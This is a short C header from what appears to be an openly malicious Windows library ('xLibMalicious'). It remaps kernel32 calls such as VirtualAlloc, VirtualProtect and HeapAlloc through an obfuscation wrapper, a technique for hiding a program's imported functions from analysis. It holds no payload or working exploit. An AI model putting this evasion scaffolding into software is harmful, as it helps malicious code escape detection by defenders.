//
// skulk@ioc.ninja
//
#pragma once



#include "xLibMaliciousApi.h"
#include "xLibMaliciousExternalApi.h"

#include "xOsApi.h"
#include "xOsReplacementApi.h"



#ifdef X_USE_OBFUSCATED_API
	#define GetNativeSystemInfo		X_KERNEL32_CALL(GetNativeSystemInfo)
	#define GetProcessHeap			X_KERNEL32_CALL(GetProcessHeap)
	#define GetThreadLocale			X_KERNEL32_CALL(GetThreadLocale)
	#define HeapAlloc				X_KERNEL32_CALL(HeapAlloc)
	#define HeapFree				X_KERNEL32_CALL(HeapFree)
	#define IsBadReadPtr			X_KERNEL32_CALL(IsBadReadPtr)
	#define SetLastError			X_KERNEL32_CALL(SetLastError)
	#define VirtualAlloc			X_KERNEL32_CALL(VirtualAlloc)
	#define VirtualFree				X_KERNEL32_CALL(VirtualFree)
	#define VirtualProtect			X_KERNEL32_CALL(VirtualProtect)
#endif
